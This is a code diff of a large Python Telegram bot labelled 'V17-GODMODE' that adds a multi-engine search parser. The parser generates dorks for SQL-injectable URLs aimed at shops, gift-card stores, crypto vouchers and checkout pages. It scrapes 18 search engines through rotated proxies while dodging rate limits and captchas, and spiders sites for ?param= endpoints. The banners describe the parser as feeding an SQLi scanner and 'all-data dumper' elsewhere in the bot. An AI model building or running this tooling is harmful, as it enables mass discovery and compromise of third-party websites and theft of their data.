@@ -15175,14 +15175,6 @@ if "--v11-proxy-once" in _v11_sys.argv:
 
 
 
-
-
-
-
-
-
-
-
 # ==================== V12 BULLETPROOF PERSISTENT ROUTER & SINGLE-INSTANCE ENGINE ====================
 import fcntl as _v12_fcntl
 import hashlib as _v12_hashlib
@@ -15195,7 +15187,7 @@ try:
 except Exception:
     pass
 
-_V12_VERSION_TAG = "V16-PERFECTION"
+_V12_VERSION_TAG = "V17-GODMODE"
 _V12_STATE_FILE = os.path.join("data", "v12_user_states.json")
 _V12_LOCK_FD = None
 _V12_CONV_REF = None
@@ -15830,7 +15822,7 @@ async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return MENU
 
 
-# Stamp live `[V16-PERFECTION]` version right on top button of Admin Panel so Owner sees it in 1 second!
+# Stamp live `[V17-GODMODE]` version right on top button of Admin Panel so Owner sees it in 1 second!
 _v12_prev_make_admin_menu = make_admin_menu
 
 
@@ -15852,7 +15844,7 @@ def make_admin_menu():
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# 🚀 HYPER V16-PERFECTION: DYNAMIC VPS HARDWARE CONTROLLER + 1-SEC MULTI-JUDGE PROXY
+# 🚀 HYPER V17-GODMODE: DYNAMIC VPS HARDWARE CONTROLLER + 1-SEC MULTI-JUDGE PROXY
 #    + 7-ENGINE RUST HTTP/2 DORK PARSER + FULL MULTI-CORE SQLi & ALL-DUMPER
 # ══════════════════════════════════════════════════════════════════════════════
 async def _get(session: aiohttp.ClientSession, url: str, proxy_url: str) -> str:
@@ -17293,7 +17285,7 @@ async def _run_dump_pipeline(
     return MENU
 
 
-# ── V16-PERFECTION DYNAMIC HARDWARE & ENGINE CONFIGURATION CENTER ──────────────────
+# ── V17-GODMODE DYNAMIC HARDWARE & ENGINE CONFIGURATION CENTER ──────────────────
 import secrets as _v14_secrets
 import urllib.parse as _v14_up
 
@@ -17314,7 +17306,7 @@ except Exception:
     _V14ProxyConnector = None
     _V14_SOCKS_OK = False
 
-_V12_VERSION_TAG = "V16-PERFECTION"
+_V12_VERSION_TAG = "V17-GODMODE"
 _V14_CFG_FILE = os.path.join("data", "v14_engine_config.json")
 _V14_ELITE_PROXY_FILE = os.path.join("data", "v14_elite_proxies.json")
 
@@ -17518,7 +17510,7 @@ def _v14_save_elite_proxies(px_list: list[str]) -> None:
         pass
 
 
-# ── V16-PERFECTION 1-SECOND MULTI-SOURCE PROXY SCRAPER + 10-CDN EDGE VALIDATOR ─────
+# ── V17-GODMODE 1-SECOND MULTI-SOURCE PROXY SCRAPER + 10-CDN EDGE VALIDATOR ─────
 _V14_FAST_PROXY_FEEDS = [
     ("http", "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=7000&country=all"),
     ("http", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=7000&country=all&ssl=all&anonymity=all"),
@@ -17825,7 +17817,7 @@ async def _v14_scrape_proxies_button_fast(query) -> int:
     return MENU
 
 
-# ── V16-PERFECTION HIGH-YIELD DORK GENERATOR + ENGINE-NATIVE DORK TRANSLATOR ───────
+# ── V17-GODMODE HIGH-YIELD DORK GENERATOR + ENGINE-NATIVE DORK TRANSLATOR ───────
 _V14_GOLD_SQLI_PARAMS = [
     "id", "pid", "cid", "cat", "page", "item", "uid", "prod", "product_id",
     "news_id", "view", "num", "nid", "no", "article_id", "category_id",
@@ -17985,7 +17977,7 @@ def _v14_translate_dork_for_engine(raw_dork: str, engine_name: str) -> str:
     return d
 
 
-# ── V16-PERFECTION 7-ENGINE ASYNC RUST HTTP/2 + REAL SITE PARAM SPIDER ENGINE ──────
+# ── V17-GODMODE 7-ENGINE ASYNC RUST HTTP/2 + REAL SITE PARAM SPIDER ENGINE ──────
 _V14_HREF_RE     = re.compile(r'''href=["']([^"'<>\s]{8,700})["']''', re.I)
 _V14_GOOGLE_Q_RE = re.compile(r'''/url\?(?:q|url)=([^&"'<>\s]+)''', re.I)
 _V14_YAHOO_RU_RE = re.compile(r'''/RU=([^/"'&<>\s]+)''')
@@ -18911,7 +18903,7 @@ async def run_vuln_alldata_dumper(
     )
 
 
-# ── V16-PERFECTION INTERACTIVE TELEGRAM UI FOR `⚙️ VPS & ENGINE SETTINGS` ──────────
+# ── V17-GODMODE INTERACTIVE TELEGRAM UI FOR `⚙️ VPS & ENGINE SETTINGS` ──────────
 def _v14_settings_panel_text() -> str:
     lim = get_v14_runtime_limits()
     hw = lim["hw"]
@@ -18976,7 +18968,7 @@ def make_admin_menu():
     kb = _v14_prev_admin_menu()
     rows = [list(r) for r in kb.inline_keyboard]
     new_rows = [
-        [InlineKeyboardButton("☢️ FORCE KILL ALL TASKS [V16-PERFECTION]", callback_data="admin_killall")],
+        [InlineKeyboardButton("☢️ FORCE KILL ALL TASKS [V17-GODMODE]", callback_data="admin_killall")],
         [InlineKeyboardButton(f"⚙️ VPS & Engine Settings ({get_v14_runtime_limits()['short']})", callback_data="v14_settings")],
     ]
     for r in rows:
@@ -19196,7 +19188,7 @@ async def _v12_pre_router_guard(update: Update, context: ContextTypes.DEFAULT_TY
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# 💎🧠 HYPER V16-PERFECTION:
+# 💎🧠 HYPER V17-GODMODE:
 #   [1] ADVANCED KEYWORDS QUALITY CHECKER (Video UI Style: Premium / Good / Normal / Bad)
 #       + "❓ Not have keywords?" + Instant UHQ/HQ Keyword Maker + 1-Click Check Now
 #       + Selective Download (Premium Only, Good Only, Normal, Bad, Premium+Good, All, Split ZIP)
@@ -20871,6 +20863,1321 @@ async def _v12_pre_router_guard(update: Update, context: ContextTypes.DEFAULT_TY
         context.user_data.pop("v15_mode", None)
         _v12_spawn_bg_pipeline(uid, "AI Keyword Parser", _v15_execute_ai_parser_and_deliver(msg.chat_id, uid, target_str, context))
         raise ApplicationHandlerStop()
+
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# V17-GODMODE-PARSER: 18-ENGINE SYNDICATION + URLSAFE BING + DOM ?PARAM= HARVESTER
+#   Fixes ALL 7 Real-World Yield Killers from Live 50,000-Dork VPS Run:
+#   [1] Multi-Core Worker Zero-Loss Checkpoints (NO 7-of-8 worker wipe on finish!)
+#   [2] URL-Safe Base64 + `&amp;u=a1...` Bing Decoder + Direct Bing RSS XML `<link>`
+#   [3] Smart 7-Word Dork Condenser + Native Engine URL Operators (NO `"file?id="` body quotes!)
+#   [4] 18 Global Search Endpoints + Per-Host Token-Bucket Rate Governor (NO 3-sec IP ban!)
+#   [5] Real SERP-Passing Multi-Protocol Proxy Pre-Flight (`HTTP/HTTPS/SOCKS5/SOCKS4`)
+#   [6] Deep Live Site DOM `<a href>` + `<form action>` `?param=` Endpoint Harvester
+#   [7] Separate Pure `UHQ_SQLi_Param_URLs_<N>.txt` File + 1-Click Direct Scan/Dump Buttons!
+# ══════════════════════════════════════════════════════════════════════════════
+
+# Preserve real SQLi DB parameters (`cid`, `sid`, `ref`, `source`, `keyword`, `type`)!
+_STRIP_PARAMS = frozenset([
+    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
+    "utm_id", "utm_source_platform", "utm_creative_format", "utm_marketing_tactic",
+    "fbclid", "gclid", "msclkid", "twclid", "ttclid", "li_fat_id", "wbraid",
+    "gbraid", "dclid", "yclid", "zanpid", "clickid", "click_id",
+    "msockid", "wa", "whr", "JitExp", "mkt", "WT.mc_id", "WT.srch",
+    "__hssc", "__hstc", "__hsrc", "hsctaTracking", "hsa_acc", "hsa_cam",
+    "hsa_grp", "hsa_ad", "hsa_src", "hsa_tgt", "hsa_kw", "hsa_mt",
+    "hsa_net", "hsa_ver", "mc_cid", "mc_eid", "vero_id", "mkt_tok",
+])
+
+_V17_BING_ANY_U_RE = re.compile(r'(?:[?&]|&amp;)u=(a1[A-Za-z0-9_\-]+=*)')
+_V17_RSS_LINK_RE   = re.compile(r'<link>\s*(https?://[^<\s]+)\s*</link>', re.I)
+_V17_FORM_GET_RE   = re.compile(
+    r'<form\b[^>]*action=["\']([^"\'<>#]{1,300})["\'][^>]*>(.*?)</form>',
+    re.I | re.S,
+)
+_V17_INPUT_NAME_RE = re.compile(r'<input\b[^>]*name=["\']([a-zA-Z0-9_]{1,32})["\']', re.I)
+
+
+def decode_bing_redirect(href: str) -> str:
+    """Decode Bing URL-safe base64 (`u=a1...`) & HTML-entity-encoded redirects accurately."""
+    try:
+        clean_href = (href or "").replace("&amp;", "&").strip()
+        if "bing.com/ck/a" in clean_href or "/ck/a?" in clean_href or "u=a1" in clean_href:
+            m = _V17_BING_ANY_U_RE.search(clean_href)
+            u_val = ""
+            if m:
+                u_val = m.group(1)
+            else:
+                full = clean_href if clean_href.startswith("http") else "https://www.bing.com" + clean_href
+                qs = parse_qs(urlparse(full).query)
+                if "u" in qs:
+                    u_val = qs["u"][0]
+            if u_val:
+                raw_b64 = u_val[2:] if u_val.startswith("a1") else u_val
+                rem = len(raw_b64) % 4
+                if rem:
+                    raw_b64 += "=" * (4 - rem)
+                for dec_fn in (base64.urlsafe_b64decode, base64.b64decode):
+                    try:
+                        decoded = dec_fn(raw_b64).decode("utf-8", errors="ignore").strip()
+                        if decoded.startswith(("http://", "https://")):
+                            return decoded
+                    except Exception:
+                        continue
+    except Exception:
+        pass
+    return href
+
+
+def is_valid_url(url: str) -> bool:
+    """Accept all real target HTTP/HTTPS URLs INCLUDING root `?param=` SQLi URLs (`/?id=12`, `/?page_id=5`)."""
+    try:
+        parsed = urlparse((url or "").strip())
+        if parsed.scheme not in ("http", "https"):
+            return False
+        netloc = parsed.netloc.lower()
+        domain = netloc.split(":")[0]
+        if domain.startswith("www."):
+            domain = domain[4:]
+        if not domain or "." not in domain or len(domain) < 4:
+            return False
+        for bl in BLACKLIST_DOMAINS:
+            if domain == bl or domain.endswith("." + bl):
+                return False
+        if any(h in domain for h in _V14_SKIP_HOSTS):
+            return False
+        path = parsed.path or ""
+        has_real_query = bool(parsed.query and "=" in parsed.query)
+        if (not path or path == "/") and not has_real_query:
+            return False
+        if path and JUNK_EXT.search(path):
+            return False
+        return True
+    except Exception:
+        return False
+
+
+def url_quality_score(url: str) -> int:
+    """Strongly rank real SQLi `?param=` PHP/ASP/JSP/CFM endpoints at the very top."""
+    u = (url or "").lower()
+    score = 15
+    if "?" in u and "=" in u:
+        score += 55
+        if any(ext in u for ext in (".php?", ".asp?", ".aspx?", ".jsp?", ".cfm?", ".cgi?", ".do?")):
+            score += 22
+        if re.search(r'[?&](id|pid|cid|cat|item|uid|prod|product_id|order_id|page_id|news_id|article_id|num|nid|view|shop|route)=', u):
+            score += 18
+        if re.search(r'=\d+\b', u):
+            score += 10
+    elif any(ext in u for ext in (".php", ".asp", ".aspx", ".jsp")):
+        score += 12
+    return min(150, score)
+
+
+def _v14_expand_high_yield_dorks(
+    keywords: list,
+    limit: int,
+    custom_patterns: list[str] | None = None,
+    target_countries: list | None = None,
+) -> list[str]:
+    """Generate tight 2-to-3-word UHQ SQLi dorks that hit thousands of live pages instead of 0-hit 8-word stuffing."""
+    limit = max(1, int(limit))
+    core_kws: list[str] = []
+    seen_kw: set[str] = set()
+    for raw_k in (keywords or []):
+        if not raw_k or not str(raw_k).strip():
+            continue
+        toks = [w for w in re.sub(r'[^a-zA-Z0-9\-]', ' ', str(raw_k).lower()).split() if len(w) >= 2 and not w.isdigit()]
+        if not toks:
+            continue
+        for take_n in (2, 3, 1):
+            if len(toks) >= take_n:
+                phrase = " ".join(toks[:take_n])
+                if phrase not in seen_kw:
+                    seen_kw.add(phrase)
+                    core_kws.append(phrase)
+    if not core_kws:
+        core_kws = ["stripe checkout", "woocommerce shop", "giftcard store", "member login", "gaming topup", "crypto voucher"]
+
+    random.shuffle(core_kws)
+    files = _V14_GOLD_FILES.copy()
+    params = _V14_GOLD_SQLI_PARAMS.copy()
+    tlds = [t.lstrip(".") if not t.startswith("site:") else t[5:].lstrip(".") for t in (target_countries or _V14_REAL_TLDS)]
+    intents = _V14_REAL_INTENTS.copy()
+    random.shuffle(files)
+    random.shuffle(params)
+
+    base_pats = custom_patterns or [
+        "inurl:{file}?{param}= {kw}",
+        "inurl:{file} {kw}",
+        "inurl:.php?{param}= {kw}",
+        "inurl:?{param}= {kw}",
+        "inurl:{file}?{param}= {kw} site:{tld}",
+        "inurl:{file} {kw} {intent}",
+    ]
+
+    out: list[str] = []
+    seen: set[str] = set()
+    f_cyc = itertools.cycle(files)
+    p_cyc = itertools.cycle(params)
+    t_cyc = itertools.cycle(tlds)
+    i_cyc = itertools.cycle(intents)
+
+    for pat in base_pats:
+        for kw in core_kws:
+            d = pat.format(file=next(f_cyc), param=next(p_cyc), kw=kw, tld=next(t_cyc), intent=next(i_cyc))
+            if d not in seen:
+                seen.add(d)
+                out.append(d)
+                if len(out) >= limit:
+                    return out[:limit]
+
+    for fn in files:
+        for pr in params:
+            for kw in core_kws:
+                for d in (
+                    f"inurl:{fn}?{pr}= {kw}",
+                    f"inurl:{fn} {kw}",
+                    f"inurl:.php?{pr}= {kw} site:{next(t_cyc)}",
+                ):
+                    if d not in seen:
+                        seen.add(d)
+                        out.append(d)
+                        if len(out) >= limit:
+                            return out[:limit]
+
+    idx_extra = 1
+    while len(out) < limit:
+        kw = core_kws[idx_extra % len(core_kws)]
+        fn = files[idx_extra % len(files)]
+        pr = params[(idx_extra // 3) % len(params)]
+        tl = tlds[(idx_extra // 7) % len(tlds)]
+        it = intents[(idx_extra // 11) % len(intents)]
+        d = f"inurl:{fn}?{pr}= {kw} {it}" if idx_extra % 2 == 0 else f"inurl:{fn}?{pr}= {kw} site:{tl}"
+        if d not in seen:
+            seen.add(d)
+            out.append(d)
+        idx_extra += 1
+    return out[:limit]
+
+
+_V17_DORK_SCRIPT_RE = re.compile(r'([a-zA-Z0-9_\-]+\.(?:php|asp|aspx|jsp|cfm|cgi))', re.I)
+_V17_DORK_PARAM_RE  = re.compile(r'[?&:]?([a-zA-Z0-9_]{1,24})=', re.I)
+_V17_DORK_SITE_RE   = re.compile(r'\bsite:\.?([a-zA-Z0-9.\-]+)', re.I)
+_V17_NOISE_WORDS    = frozenset([
+    "inurl", "allinurl", "intitle", "allintitle", "intext", "allintext",
+    "filetype", "ext", "site", "php", "asp", "aspx", "jsp", "html",
+])
+
+
+def _v14_translate_dork_for_engine(raw_dork: str, engine_name: str) -> str:
+    """
+    V17 Smart Condenser + Engine-Native URL Query Translator:
+    - NEVER wraps `"product.php?id="` in literal body-text quotes!
+    - Automatically condenses old 6-to-8-word over-stuffed dorks down to tight 2–3 high-signal niche words!
+    """
+    if not raw_dork:
+        return ""
+    d = _V14_FAKE_PAGE_RE.sub(" ", raw_dork)
+
+    m_sc = _V17_DORK_SCRIPT_RE.search(d)
+    script_tok = m_sc.group(1).lower() if m_sc else ""
+    script_stem = script_tok.rsplit(".", 1)[0] if script_tok else ""
+    script_ext = script_tok.rsplit(".", 1)[1] if "." in script_tok else "php"
+
+    m_pr = _V17_DORK_PARAM_RE.search(d)
+    param_tok = m_pr.group(1).lower() if m_pr else ""
+    if param_tok in ("inurl", "site", "intitle", "intext", "ext", "filetype"):
+        param_tok = ""
+
+    m_site = _V17_DORK_SITE_RE.search(d)
+    site_tok = m_site.group(1).lstrip(".").lower() if m_site else ""
+
+    stripped = _V17_DORK_SITE_RE.sub(" ", d)
+    stripped = re.sub(r'\b(?:all)?(?:inurl|intitle|intext|filetype|ext):\S+', ' ', stripped, flags=re.I)
+    stripped = re.sub(r'"[^"]*[?=][^"]*"', ' ', stripped)
+    words = []
+    seen_w = set()
+    for w in re.sub(r'[^a-zA-Z0-9\-]', ' ', stripped.lower()).split():
+        if len(w) >= 2 and not w.isdigit() and w not in _V17_NOISE_WORDS and w != script_stem and w != param_tok:
+            if w not in seen_w:
+                seen_w.add(w)
+                words.append(w)
+        if len(words) >= 3:
+            break
+
+    niche_2w = " ".join(words[:2]) if words else "shop checkout"
+    niche_3w = " ".join(words[:3]) if words else niche_2w
+    site_clause = f" site:{site_tok}" if (site_tok and len(site_tok) <= 6 and (hash(raw_dork) % 3 == 0)) else ""
+
+    eng_base = engine_name.split("_", 1)[0]
+
+    if eng_base in ("google", "startpage"):
+        if script_tok and param_tok:
+            return f"inurl:{script_tok}?{param_tok}= {niche_2w}{site_clause}".strip()
+        if script_tok:
+            return f"inurl:{script_tok} {niche_3w}{site_clause}".strip()
+        if param_tok:
+            return f"inurl:?{param_tok}= {niche_2w}{site_clause}".strip()
+        return f"inurl:php?id= {niche_3w}".strip()
+
+    if eng_base in ("bing", "ecosia"):
+        if script_stem and script_stem not in ("index", "main", "default", "home"):
+            return f"inurl:{script_stem}.{script_ext} {niche_2w}{site_clause}".strip()
+        if param_tok:
+            return f"inurl:{script_ext} {param_tok} {niche_3w}{site_clause}".strip()
+        return f"inurl:product.php {niche_3w}{site_clause}".strip()
+
+    if eng_base in ("yahoo", "aol"):
+        if script_tok:
+            return f"inurl:{script_tok} {niche_2w}{site_clause}".strip()
+        if param_tok:
+            return f"inurl:php {param_tok} {niche_2w}{site_clause}".strip()
+        return f"inurl:product.php {niche_2w}".strip()
+
+    if eng_base in ("duckduckgo", "brave"):
+        if script_tok:
+            return f"inurl:{script_tok} {niche_2w}{site_clause}".strip()
+        if param_tok:
+            return f"inurl:{param_tok}= {niche_2w}".strip()
+        return f"inurl:php {niche_3w}".strip()
+
+    if script_stem and script_stem not in ("index", "default"):
+        return f"{script_stem} {script_ext} {niche_2w}".strip()
+    return f"{niche_3w} {param_tok or 'product'} php".strip()
+
+
+def _v14_extract_serp_urls(html: str, engine_name: str) -> list[str]:
+    """Extract clean decoded organic URLs across RSS XML + all 18 HTML search frontends."""
+    if not html or len(html) < 80:
+        return []
+    out: list[str] = []
+    seen: set[str] = set()
+
+    def _keep(u: str):
+        if not u:
+            return
+        u = u.replace("&amp;", "&").strip().split("#", 1)[0]
+        if "?" not in u:
+            u = u.rstrip("/")
+        if not u.startswith(("http://", "https://")) or u in seen:
+            return
+        seen.add(u)
+        low = u.lower()
+        if any(h in low for h in _V14_SKIP_HOSTS):
+            return
+        if is_valid_url(u):
+            out.append(u)
+
+    eng_base = engine_name.split("_", 1)[0]
+
+    if engine_name == "bing_rss" or ("<rss" in html[:400].lower() and "<item>" in html[:4000].lower()):
+        for m_lnk in _V17_RSS_LINK_RE.findall(html):
+            _keep(_v14_up.unquote(m_lnk) if "%2F" in m_lnk or "%3F" in m_lnk else m_lnk)
+        if out:
+            return out
+
+    if eng_base == "google":
+        for enc in _V14_GOOGLE_Q_RE.findall(html.replace("&amp;", "&")):
+            _keep(_v14_up.unquote(enc))
+    elif eng_base in ("yahoo", "aol"):
+        for enc in _V14_YAHOO_RU_RE.findall(html):
+            _keep(_v14_up.unquote(enc))
+    elif eng_base == "bing":
+        for tok in _V17_BING_ANY_U_RE.findall(html):
+            _keep(decode_bing_redirect("https://www.bing.com/ck/a?u=" + tok))
+    elif eng_base == "duckduckgo":
+        for enc in _V14_DDG_UDDG_RE.findall(html.replace("&amp;", "&")):
+            _keep(_v14_up.unquote(enc))
+
+    for raw_h in _V14_HREF_RE.findall(html):
+        h = raw_h.replace("&amp;", "&").strip()
+        if h.startswith("/url?"):
+            m = _V14_GOOGLE_Q_RE.search(h)
+            if m:
+                _keep(_v14_up.unquote(m.group(1)))
+            continue
+        if h.startswith("//"):
+            h = "https:" + h
+        h = _fix_href(h)
+        _keep(h)
+
+    return out
+
+
+async def _v17_preflight_serp_proxies(candidates: list[str], max_test: int = 500, concurrency: int = 180) -> list[str]:
+    if not candidates or os.environ.get("_V14_MOCK_SEARCH_BASE") or os.environ.get("_V15_FAST_OFFLINE_TEST") == "1":
+        return list(candidates or [])[:400]
+    pool_in = list(dict.fromkeys([p for p in candidates if p]))[:max_test]
+    if not pool_in:
+        return []
+    sem = asyncio.Semaphore(max(30, concurrency))
+    gold: list[tuple[float, str]] = []
+    serp_probes = (
+        ("https://www.bing.com/search?q=inurl%3Aproduct.php+shop&format=rss&count=15", "<item>"),
+        ("https://search.yahoo.com/search?p=inurl%3Aproduct.php+shop&n=15", "/RU="),
+        ("https://search.brave.com/search?q=inurl%3Aproduct.php+shop&source=web", "href="),
+    )
+
+    async def _check_one(idx: int, px: str):
+        probe_url, marker = serp_probes[idx % len(serp_probes)]
+        async with sem:
+            t0 = time.monotonic()
+            cli = _v14_new_primp_client(px, timeout_s=3.2)
+            if cli is not None:
+                try:
+                    r = await cli.get(probe_url, headers=random.choice(HEADERS_LIST), timeout=3.2)
+                    txt = r.text or ""
+                    if r.status_code == 200 and marker in txt and not _is_captcha_page(txt):
+                        gold.append((time.monotonic() - t0, px))
+                        return
+                except Exception:
+                    return
+
+    await asyncio.gather(*(_check_one(i, p) for i, p in enumerate(pool_in)), return_exceptions=True)
+    gold.sort(key=lambda x: x[0])
+    return [p for _, p in gold]
+
+
+_V17_GLOBAL_ENGINES = (
+    "bing_rss",
+    "yahoo_us",
+    "duckduckgo_html",
+    "brave_web",
+    "bing_html",
+    "yahoo_uk",
+    "aol_web",
+    "duckduckgo_lite",
+    "yahoo_ca",
+    "mojeek_web",
+    "yahoo_au",
+    "ecosia_web",
+    "yahoo_in",
+    "startpage_web",
+    "yahoo_sg",
+    "google_web",
+    "yahoo_de",
+    "yahoo_fr",
+)
+
+_V17_YAHOO_HOST_MAP = {
+    "yahoo_us": "https://search.yahoo.com/search",
+    "yahoo_uk": "https://uk.search.yahoo.com/search",
+    "yahoo_ca": "https://ca.search.yahoo.com/search",
+    "yahoo_au": "https://au.search.yahoo.com/search",
+    "yahoo_in": "https://in.search.yahoo.com/search",
+    "yahoo_sg": "https://sg.search.yahoo.com/search",
+    "yahoo_de": "https://de.search.yahoo.com/search",
+    "yahoo_fr": "https://fr.search.yahoo.com/search",
+}
+
+
+async def _v14_worker_async_core(
+    pull_dork_batch_fn,
+    worker_limit: int,
+    elite_proxies: list[str],
+    cfg_spec: dict,
+    report_fn=None,
+    stop_check_fn=None,
+    checkpoint_path: str = "",
+) -> tuple[dict[str, int], int, int]:
+    loop = asyncio.get_running_loop()
+    dns_exec = concurrent.futures.ThreadPoolExecutor(max_workers=96)
+    loop.set_default_executor(dns_exec)
+
+    pmode = cfg_spec.get("proxy_mode", "instant")
+    qmode = cfg_spec.get("parser_mode", "balanced")
+    http_conc = int(cfg_spec.get("parser_http_sem", 120))
+    n_coros = int(cfg_spec.get("parser_coros", 72))
+    spider_conc = max(48, int(cfg_spec.get("spider_sem", 64)))
+
+    found_scores: dict[str, int] = {}
+    seen_norm: set[str] = set()
+    dom_param_cnt: dict[str, int] = {}
+    dom_static_cnt: dict[str, int] = {}
+    spidered_targets: set[str] = set()
+    spider_q: asyncio.Queue = asyncio.Queue(maxsize=8000)
+
+    max_param_per_dom = 28 if qmode == "deep" else 22
+    max_static_per_dom = 4 if qmode == "deep" else 2
+    enable_spider = True
+
+    healthy_px = list(elite_proxies) if elite_proxies else []
+    random.shuffle(healthy_px)
+    px_strikes: dict[str, int] = {}
+    px_cursor = [0]
+
+    direct_cooldown_until: dict[str, float] = {}
+    direct_host_locks: dict[str, asyncio.Lock] = {}
+    direct_last_hit: dict[str, float] = {}
+
+    def _next_proxy() -> str:
+        if not healthy_px:
+            return ""
+        if pmode == "hybrid" and (px_cursor[0] % 3 == 2):
+            px_cursor[0] += 1
+            return ""
+        idx = px_cursor[0] % len(healthy_px)
+        px_cursor[0] += 1
+        return healthy_px[idx]
+
+    def _strike_proxy(px: str):
+        if not px:
+            return
+        st = px_strikes.get(px, 0) + 1
+        px_strikes[px] = st
+        if st >= 2 and px in healthy_px:
+            try:
+                healthy_px.remove(px)
+            except ValueError:
+                pass
+
+    def _add_real_url(u: str, allow_spider_seed: bool = True):
+        if len(found_scores) >= worker_limit or not is_valid_url(u):
+            return
+        norm = normalize_url(u)
+        if norm in seen_norm:
+            return
+        has_param = ("?" in u and "=" in u)
+        try:
+            parsed = _v14_up.urlparse(u)
+            dom = parsed.netloc.lower().lstrip("www.")
+            if has_param:
+                if dom_param_cnt.get(dom, 0) >= max_param_per_dom:
+                    return
+                dom_param_cnt[dom] = dom_param_cnt.get(dom, 0) + 1
+            else:
+                if dom_static_cnt.get(dom, 0) >= max_static_per_dom:
+                    return
+                dom_static_cnt[dom] = dom_static_cnt.get(dom, 0) + 1
+
+            if enable_spider and allow_spider_seed and dom:
+                root_u = f"{parsed.scheme}://{parsed.netloc}/"
+                for seed_cand in (u, root_u):
+                    if seed_cand not in spidered_targets and len(spidered_targets) < 40_000 and not spider_q.full():
+                        spidered_targets.add(seed_cand)
+                        spider_q.put_nowait(seed_cand)
+        except Exception:
+            pass
+        seen_norm.add(norm)
+        found_scores[u.rstrip("/") if not has_param else u] = url_quality_score(u)
+
+    def _flush_checkpoint():
+        if not checkpoint_path or not found_scores:
+            return
+        try:
+            tmp_p = f"{checkpoint_path}.{os.getpid()}.tmp"
+            with open(tmp_p, "w", encoding="utf-8") as wf:
+                json.dump(found_scores, wf)
+            os.replace(tmp_p, checkpoint_path)
+        except Exception:
+            pass
+
+    direct_primp = [c for c in (_v14_new_primp_client(None, 5.0) for _ in range(8)) if c is not None]
+    proxy_primp: dict[str, object] = {}
+    aio_conn = aiohttp.TCPConnector(limit=http_conc + 120, limit_per_host=0, ssl=False, ttl_dns_cache=600)
+    http_sem = asyncio.Semaphore(http_conc)
+    spider_sem = asyncio.Semaphore(spider_conc)
+    startpage_sc = [""]
+    sc_lock = asyncio.Lock()
+
+    def _get_primp_for(px: str):
+        if os.environ.get("_V14_MOCK_SEARCH_BASE"):
+            return None
+        if not px:
+            return random.choice(direct_primp) if direct_primp else None
+        c = proxy_primp.get(px)
+        if c is None:
+            if len(proxy_primp) >= 512:
+                proxy_primp.pop(next(iter(proxy_primp)), None)
+            c = _v14_new_primp_client(px, 4.2)
+            if c is not None:
+                proxy_primp[px] = c
+        return c
+
+    async def _raw_http_request(
+        aio_sess: aiohttp.ClientSession,
+        method: str,
+        url: str,
+        params: dict | None = None,
+        data: dict | None = None,
+        headers: dict | None = None,
+        cookies: dict | None = None,
+        use_proxy: str = "",
+        timeout_s: float = 4.5,
+    ) -> tuple[int, str]:
+        hdrs = (headers or random.choice(HEADERS_LIST)).copy()
+        cli = _get_primp_for(use_proxy)
+        if cli is not None:
+            try:
+                if method == "POST":
+                    resp = await cli.post(url, data=data, headers=hdrs, cookies=cookies, timeout=timeout_s)
+                else:
+                    resp = await cli.get(url, params=params, headers=hdrs, cookies=cookies, timeout=timeout_s)
+                return resp.status_code, (resp.text or "")
+            except Exception:
+                return 0, ""
+
+        try:
+            full_url = f"{url}?{_v14_up.urlencode(params)}" if (params and method == "GET") else url
+            kw = dict(
+                headers=hdrs,
+                cookies=cookies,
+                timeout=aiohttp.ClientTimeout(total=timeout_s, sock_connect=1.8, sock_read=2.8),
+                ssl=False,
+                allow_redirects=True,
+            )
+            if use_proxy and use_proxy.startswith(("http://", "https://")):
+                kw["proxy"] = use_proxy
+            elif use_proxy and _V14_SOCKS_OK and _V14ProxyConnector is not None:
+                sconn = _V14ProxyConnector.from_url(use_proxy, ssl=False)
+                async with aiohttp.ClientSession(connector=sconn) as ssess:
+                    if method == "POST":
+                        async with ssess.post(full_url, data=data, headers=hdrs, cookies=cookies, timeout=kw["timeout"]) as r:
+                            return r.status, await r.text(errors="ignore")
+                    async with ssess.get(full_url, headers=hdrs, cookies=cookies, timeout=kw["timeout"]) as r:
+                        return r.status, await r.text(errors="ignore")
+            if method == "POST":
+                kw["data"] = data
+                async with aio_sess.post(full_url, **kw) as r:
+                    return r.status, await r.text(errors="ignore")
+            async with aio_sess.get(full_url, **kw) as r:
+                return r.status, await r.text(errors="ignore")
+        except Exception:
+            return 0, ""
+
+    async def _pace_direct_host(eng_key: str) -> bool:
+        if os.environ.get("_V14_MOCK_SEARCH_BASE"):
+            return True
+        now = time.monotonic()
+        if now < direct_cooldown_until.get(eng_key, 0.0):
+            return False
+        lk = direct_host_locks.setdefault(eng_key, asyncio.Lock())
+        async with lk:
+            now2 = time.monotonic()
+            if now2 < direct_cooldown_until.get(eng_key, 0.0):
+                return False
+            gap = 0.085 - (now2 - direct_last_hit.get(eng_key, 0.0))
+            if gap > 0:
+                await asyncio.sleep(gap)
+            direct_last_hit[eng_key] = time.monotonic()
+        return True
+
+    async def _query_engine_once(aio_sess: aiohttp.ClientSession, eng: str, raw_dork: str, page: int = 1) -> list[str]:
+        mock_base = os.environ.get("_V14_MOCK_SEARCH_BASE", "")
+        q = _v14_translate_dork_for_engine(raw_dork, eng)
+        if not q:
+            return []
+
+        async with http_sem:
+            px = _next_proxy()
+            attempts = [px, ""] if px else [""]
+            for cur_px in attempts:
+                if not cur_px:
+                    ok_direct = await _pace_direct_host(eng)
+                    if not ok_direct:
+                        continue
+
+                if mock_base:
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", f"{mock_base}/search",
+                        params={"eng": eng, "q": q, "page": str(page)},
+                        use_proxy=cur_px, timeout_s=3.0,
+                    )
+                elif eng == "bing_rss":
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://www.bing.com/search",
+                        params={"q": q, "format": "rss", "count": "50", "first": str((page - 1) * 30 + 1), "setlang": "en"},
+                        headers={"Accept": "application/rss+xml,application/xml,text/xml,*/*", "User-Agent": random.choice(HEADERS_LIST)["User-Agent"]},
+                        use_proxy=cur_px, timeout_s=4.0,
+                    )
+                elif eng == "bing_html":
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://www.bing.com/search",
+                        params={"q": q, "count": "50", "first": str((page - 1) * 30 + 1), "setlang": "en"},
+                        headers={"Referer": "https://www.bing.com/", "User-Agent": random.choice(HEADERS_LIST)["User-Agent"]},
